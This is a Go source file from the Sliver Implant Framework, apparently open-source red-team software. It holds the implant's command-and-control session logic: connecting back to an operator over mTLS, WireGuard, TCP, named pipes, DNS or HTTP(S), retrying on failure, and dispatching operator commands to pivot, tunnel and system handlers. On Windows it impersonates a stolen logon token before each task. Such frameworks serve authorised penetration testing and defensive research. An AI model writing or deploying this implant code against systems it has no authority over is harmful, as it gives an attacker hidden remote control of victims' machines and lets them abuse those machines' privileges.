package c2

/*
   Sliver Implant Framework
   Copyright (C) 2019  Bishop Fox

   This program is free software: you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation, either version 3 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"fmt"
	"time"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"google.golang.org/protobuf/proto"
	"google.golang.org/protobuf/reflect/protoreflect"

	// {{if eq .Config.GOOS "windows"}}
	"github.com/bishopfox/sliver/implant/sliver/priv"
	"github.com/bishopfox/sliver/implant/sliver/syscalls"

	// {{end}}

	// {{if .Config.DNSc2Enabled}}
	"github.com/bishopfox/sliver/implant/sliver/transports/dnsclient"

	// {{end}}

	// {{if .Config.HTTPc2Enabled}}
	"github.com/bishopfox/sliver/implant/sliver/transports/httpclient"
	// {{end}}

	"github.com/bishopfox/sliver/implant/sliver/handlers"
	"github.com/bishopfox/sliver/implant/sliver/transports"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

var (
	readBufSize = 16 * 1024 // 16kb
)

// StartSession - Setup a Session RPC either around a provided, physical connection,
// or directly through C2 channel packages that take care of this.
func (t *C2) StartSession() (err error) {

	// Maybe move this out of here
	for t.attempts < int(t.Profile.MaxConnectionErrors) {

		// Always reinstantiate a blank but ready to work Connection
		t.Connection = transports.NewConnection()

		switch t.uri.Scheme {

		// Some protocols can count on a physical connection already being here.
		// {{if or .Config.MTLSc2Enabled .Config.WGc2Enabled .Config.TCPc2Enabled .Config.NamePipec2Enabled}}
		case "mtls", "wg", "tcp", "namedpipe", "pipe":
			if t.Conn == nil {
				return fmt.Errorf("Failed to create Connection: no physical connection in transport")
			}
			err = transports.NewSession(t.Conn, t.Connection)
			// {{end}}

		// {{if .Config.DNSc2Enabled}}
		case "dns":
			err = dnsclient.NewSessionDNS(t.uri, t.Profile, t.Connection)
			// {{end}}

		// {{if .Config.HTTPc2Enabled}}
		case "https":
			err = httpclient.NewSessionHTTPS(t.uri, t.Profile, t.Connection)

		case "http":
			err = httpclient.NewSessionHTTP(t.uri, t.Profile, t.Connection)
			// {{end}}

		default:
			return fmt.Errorf("Invalid C2 address sheme: %s", t.uri.Scheme)
		}

		// Reattempt if any error was thrown when starting/setting up the session layer
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("[%s] Connection failed: %s", t.Profile.C2.String(), err)
			// {{end}}
			t.FailedAttempt()

			// Wait according to intervals
			time.Sleep(time.Duration(t.Profile.Interval))
			continue
		}

		// Else return, there are no errors, we have thus a session
		return
	}

	return
}

// ServeSessionHandlers - Watch for and process envelopes being sent by the server.
// These envelopes are quite similarly asynchronous to beacon tasks, but they
// are NOT the same thing: this is somehow lower-level.
func (t *C2) ServeSessionHandlers() {

	connection := t.Connection

	// Reconnect active pivots
	// pivots.ReconnectActivePivots(connection)

	pivotHandlers := handlers.GetPivotHandlers()
	tunHandlers := handlers.GetTunnelHandlers()
	sysHandlers := handlers.GetSystemHandlers()
	sysPivotHandlers := handlers.GetSystemPivotHandlers() // TODO: remove this if needed
	specialHandlers := handlers.GetSpecialHandlers()

	for envelope := range connection.RequestRecv() {
		if handler, ok := specialHandlers[envelope.Type]; ok {
			// {{if .Config.Debug}}
			log.Printf("[recv] specialHandler %d", envelope.Type)
			// {{end}}
			handler(envelope.Data, Transports)

		} else if handler, ok := pivotHandlers[envelope.Type]; ok {
			// {{if .Config.Debug}}
			log.Printf("[recv] pivotHandler with type %d", envelope.Type)
			// {{end}}
			go handler(envelope, connection)
		} else if handler, ok := sysHandlers[envelope.Type]; ok {
			// Beware, here be dragons.
			// This is required for the specific case of token impersonation:
			// Since goroutines don't always execute in the same thread, but ImpersonateLoggedOnUser
			// only applies the token to the calling thread, we need to call it before every task.
			// It's fucking gross to do that here, but I could not come with a better solution.

			// {{if eq .Config.GOOS "windows" }}
			if priv.CurrentToken != 0 {
				err := syscalls.ImpersonateLoggedOnUser(priv.CurrentToken)
				if err != nil {
					// {{if .Config.Debug}}
					log.Printf("Error: %v\n", err)
					// {{end}}
				}
			}
			// {{end}}

			// {{if .Config.Debug}}
			log.Printf("[recv] sysHandler %d", envelope.Type)
			// {{end}}
			go handler(envelope.Data, func(data []byte, err error) {
				// {{if .Config.Debug}}
				if err != nil {
					log.Printf("[session] handler function returned an error: %s", err)
				}
				// {{end}}
				connection.RequestSend(&sliverpb.Envelope{
					ID:   envelope.ID,
					Data: data,
				})
			})
		} else if handler, ok := tunHandlers[envelope.Type]; ok {
			// {{if .Config.Debug}}
			log.Printf("[recv] tunHandler %d", envelope.Type)
			// {{end}}
			go handler(envelope, connection)
		} else if handler, ok := sysPivotHandlers[envelope.Type]; ok {
			// {{if .Config.Debug}}
			log.Printf("[recv] sysPivotHandlers with type %d", envelope.Type)
			// {{end}}
			go handler(envelope, connection)
		} else if handler, ok := commHandlers[envelope.Type]; ok {
			// {{if .Config.Debug}}
			log.Printf("[recv] commHandler with type %d", envelope.Type)
			// {{end}}
			go handler(envelope, connection)
		} else if handler, ok := transportHandlers[envelope.Type]; ok {
			// {{if .Config.Debug}}
			log.Printf("[recv] commHandler with type %d", envelope.Type)
			// {{end}}
			go handler(envelope.Data, func(data []byte, err error) {
				// {{if .Config.Debug}}
				if err != nil {
					log.Printf("[session] handler function returned an error: %s", err)
				}
				// {{end}}
				connection.RequestSend(&sliverpb.Envelope{
					ID:   envelope.ID,
					Data: data,
				})
			})
		} else {
			// {{if .Config.Debug}}
			log.Printf("[recv] unknown envelope type %d", envelope.Type)
			// {{end}}
			connection.RequestSend(&sliverpb.Envelope{
				ID:                 envelope.ID,
				Data:               nil,
				UnknownMessageType: true,
			})
		}
	}
}

// Envelope - Creates an envelope with the given type and data.
func Envelope(msgType uint32, message protoreflect.ProtoMessage) *sliverpb.Envelope {
	data, err := proto.Marshal(message)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Failed to encode register msg %s", err)
		// {{end}}
		return nil
	}
	return &sliverpb.Envelope{
		Type: msgType,
		Data: data,
	}
}
